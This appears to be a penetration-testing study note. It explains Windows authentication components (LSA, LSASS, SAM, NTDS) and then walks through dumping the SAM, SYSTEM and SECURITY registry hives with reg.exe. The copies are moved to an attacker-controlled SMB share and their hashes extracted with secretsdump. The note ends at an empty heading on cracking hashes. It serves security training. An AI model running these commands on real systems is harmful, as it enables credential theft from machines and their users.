The [Local Security Authority](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection) (`LSA`) is a protected subsystem that authenticates users, manages local logins, oversees all aspects of local security, and provides services for translating between user names and security identifiers (SIDs).

The security subsystem maintains security polices and user accounts on a machine. On a DC, these policies and accounts apply to the entire domain and are stored in Active Directory. Additionally, the LSA subsystem provides services for access control, permission checks, and the generation of security audit messages.

#### Windows authentication process diagram

![[Windows Authentication Process.png]]

`WinLogon` is a trusted system process, it's responsible for managing security-related user interacts, like:
- Launching `LogonUI` to prompt creds at login
- Handling password changes
- Locking & Unlocking the workstation

`WinLogon` is the only process that intercepts login requests from keyboard.

#### LSASS

Located at `%SystemRoot%\System32\Lsass.exe`in the file system

|**Authentication Packages**|**Description**|
|---|---|
|`Lsasrv.dll`|The LSA Server service both enforces security policies and acts as the security package manager for the LSA. The LSA contains the Negotiate function, which selects either the NTLM or Kerberos protocol after determining which protocol is to be successful.|
|`Msv1_0.dll`|Authentication package for local machine logons that don't require custom authentication.|
|`Samsrv.dll`|The Security Accounts Manager (SAM) stores local security accounts, enforces locally stored policies, and supports APIs.|
|`Kerberos.dll`|Security package loaded by the LSA for Kerberos-based authentication on a machine.|
|`Netlogon.dll`|Network-based logon service.|
|`Ntdsa.dll`|Directory System Agent (DSA) that manages the Active Directory database (ntds.dit), processes LDAP queries, and handles replication between domain controllers. Only loaded on Domain Controllers.|

#### SAM database

The **Security Account Manager (SAM)** is a database in windows that stores user accounts credentials. It is used to authenticate both local and remote users. User passwords are stored as hashes in the registry, typically in the form of either `LM` or `NTLM` hashes
The SAM file is located at `%SystemRoot%\system32\config\SAM` and is mounted under `HKLM\SAM`. Viewing or accessing this file requires `SYSTEM` level privileges.

To improve protection from online cracking, Windows introduced `SYSKEY` in Windows NT 4.0, when enabled, `SYSKEY` partially encrypts the SAM file on the disk.

#### Credential Manager

![[Windows CredManager.png]]

Credentials Manager is a windows built-in feature that allow users to store and manage creds used to access network resources, websites, and applications. The credentials are encrypted and stored in the following location:

```powershell
PS C:\Users\[Username]\AppData\Local\Microsoft\[Vault/Credentials]\
```

#### NTDS

It's common to encounter windows systems joined in a windows domain. This setup simplifies centralized management for administrators. In such environments, logon requests are sent to the Domain Controller in the Forest. Each DC has a file called `NTDS.dit`, and it's synchronized across all DCs. 

`NTDS.dit` is a database that stores including but not limited to:

- User accounts (username & password hash)
- Group accounts
- Computer accounts
- Group policy objects

---
# Attacking SAM, SYSTEM, and SECURITY

## Registry Hives

| Registry Hive   | Description                                                                                                                                                       |
| --------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `HKLM\SAM`      | Contains password hashes for local user accounts. These hashes can be extracted and cracked to reveal plaintext passwords.                                        |
| `HKLM\SYSTEM`   | Stores the system boot key, which is used to encrypt the SAM database. This key is required to decrypt the hashes.                                                |
| `HKLM\SECURITY` | Contains sensitive information used by the Local Security Authority (LSA), including cached domain credentials (DCC2), cleartext passwords, DPAPI keys, and more. |
We can back up these hives using the `reg.exe` utility.
#### Using reg.exe to copy registry hives

By launching `cmd.exe` with administrative privileges, we can use `reg.exe` to save copies of the registry hives. Run the following commands:

```powershell
reg.exe save hklm\sam C:\sam.save 
# The operation completed successfully.

reg.exe save hklm\system C:\system.save 
# The operation completed successfully. 

reg.exe save hklm\security C:\security.save 
# The operation completed successfully.
```

Then we can move the saved files to our attacker machine.

**Using Impacket SMB Server:**

```sh
sudo smbserver.py -smb2support CompData /home/ltnbob/Documents/
```

Then we can do:

```powershell
move sam.save \\10.10.15.16\CompData
```

## Dumping hashes with secretsdump

```sh
python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

**Hashes Output Format:**

```sh
Dumping local SAM hashes (uid:rid:lmhash:nthash)
```

```ad-note
Most modern Windows operating systems store passwords as `NT hashes`

---

Older systems (such as those prior to Windows Vista and Windows Server 2008) may store passwords as `LM hashes`
```

## Cracking hashes with Hashcat

